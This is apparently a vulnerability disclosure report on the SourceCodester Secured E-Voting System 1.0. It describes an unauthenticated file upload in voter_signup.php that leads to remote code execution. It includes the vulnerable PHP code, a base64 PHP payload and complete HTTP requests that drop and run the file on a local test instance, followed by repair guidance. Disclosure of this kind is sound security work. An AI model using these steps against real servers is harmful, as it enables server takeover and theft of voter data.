# SourceCodester Secured E-Voting System 1.0 /voter_signup.php user_image= Unrestricted File Upload leads to Remote Code Execution

## NAME OF AFFECTED PRODUCT(S)

- Secured E-Voting System (St Paul Academy Alumni 2001 set e-voting portal)

## Vendor Homepage

- https://www.sourcecodester.com/php/18790/secured-e-voting-system.html

## AFFECTED AND/OR FIXED VERSION(S)

### submitter

- qwer1230011107

## Vulnerable File

- /voter_signup.php

## VERSION(S)

- 1.0 (current public download, 2026-11)

## Software Link

- https://www.sourcecodester.com/download-code?nid=18790&title=Secured+E-Voting+System+using+PHP+and+MySQL+Source+Code

# PROBLEM TYPE

## Vulnerability Type

- Unrestricted File Upload → Remote Code Execution (CWE-434 / CWE-94)

## Root Cause

- `/voter_signup.php` lines 47-63. The "identity photo" field `user_image` is a base64 data URL captured client-side. The server extracts the MIME subtype **verbatim** and uses it as the file extension, with no whitelist, no content inspection and no `getimagesize()` check:

```php
// voter_signup.php:47-53
if (strpos($captured_image, 'data:image') === 0) {
    $img_parts = explode(";base64,", $captured_image);
    $img_type_aux = explode("image/", $img_parts[0]);
    $img_type = $img_type_aux[1];                       // ← attacker-controlled extension
    $img_base64 = base64_decode($img_parts[1]);
    $img_filename = 'voter_' . time() . '_' . uniqid() . '.' . $img_type;
    $directory = 'uploadImage/Profile/';
```

```php
// voter_signup.php:61-63
    $upload_path = $directory . $img_filename;
    if (file_put_contents($upload_path, $img_base64)) {  // ← writes .php into web root
```

- Sending `data:image/php;base64,<...>` makes the extension `php`; the file lands inside the publicly served `uploadImage/Profile/` directory and is executed by PHP.

## Impact

- **Unauthenticated** remote code execution on the web server. Registration is a public page, so any internet user can drop and execute arbitrary PHP. Complete server compromise (database credentials in `database/connection.php`, ballot data, voter PII including webcam identity photos).

# DESCRIPTION

- During the security review of "Secured E-Voting System", an unauthenticated unrestricted file upload was found in `/voter_signup.php`. The `user_image` parameter (a base64 data URL) has its MIME subtype used directly as the saved file extension. Because there is no extension whitelist and no image content validation, an attacker can store a `.php` file inside the web root and trigger its execution, obtaining full remote code execution with no credentials.

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

## Vulnerability location:

- `user_image` parameter (POST), `/voter_signup.php`

## Payload:

```
user_image=data:image/php;base64,PD9waHAgZWNobyAiRVZPVEUtUkNFLVBST09GLSIuKDcqNik7ID8+
```

(decoded payload: `<?php echo "EVOTE-RCE-PROOF-".(7*6); ?>` — a harmless computation probe)

## Steps (all requests against the local deployment at http://127.0.0.1:8138):

1. `GET /voter_signup` → save `PHPSESSID` cookie and the `csrf_token` form field (the page has CSRF, which does not hinder the attack: the token is handed to the attacker by the page itself).
2. `POST /voter_signup` with all required fields and the payload above:

```
POST /voter_signup HTTP/1.1
Host: 127.0.0.1:8138
Cookie: PHPSESSID=<attacker session>
Content-Type: application/x-www-form-urlencoded

csrf_token=<token from the page>&full_name=POC+RCE&nickname=pocrce&email=pocrce191354%40local.test&phone=07094191354&password=Poc%2312345&confirm_password=Poc%2312345&user_image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgZWNobyAiRVZPVEUtUkNFLVBST09GLSIuKDcqNik7ID8%2B&register_btn=1
```

3. Server responds `Registration successful!` — the file `uploadImage/Profile/voter_<time>_<uniqid>.php` has been written (stored path is visible in `users.user_image`).
4. Request the dropped file:

```
GET /uploadImage/Profile/voter_1794191354_6af12ffa1dba6.php HTTP/1.1
Host: 127.0.0.1:8138
```

```
HTTP/1.1 200 OK

EVOTE-RCE-PROOF-42
```

`7*6` was computed **server-side by PHP** — arbitrary code execution confirmed.

Full request/response log: `poc/F01-voter_signup-rce.txt`

## Screenshot: uploaded .php file executing in the browser (EVOTE-RCE-PROOF-42, 7*6 computed server-side)

![F1 uploaded php executes](img/f01-rce-proof.jpeg)

# Suggested repair

1. **Whitelist the MIME subtype**: accept only `jpeg|jpg|png|webp`, and reject everything else (compare `Admin/edit_voter.php` which does this correctly at lines 60-63).
2. **Validate image content**: run `getimagesize()` / re-encode the image before storing; never trust the data-URL header.
3. **Store outside the web root** or in a location with PHP execution disabled (`.htaccess` `php_flag engine off`), and serve through a controller.
4. **Randomize and audit**: keep extensions server-derived, not client-derived.

# Dedup note

- NVD: 0 CVEs for this product (aliases `Secured E-Voting`, `E-Voting System` checked 2026-11-09).
- VulDB: no entries for this product or these files (`voter_signup`). Same-author project "Online Voting System 1.0" entries (e.g. VDB-376162 `/saveVote.php`) cover a **different product** with a non-overlapping file set.
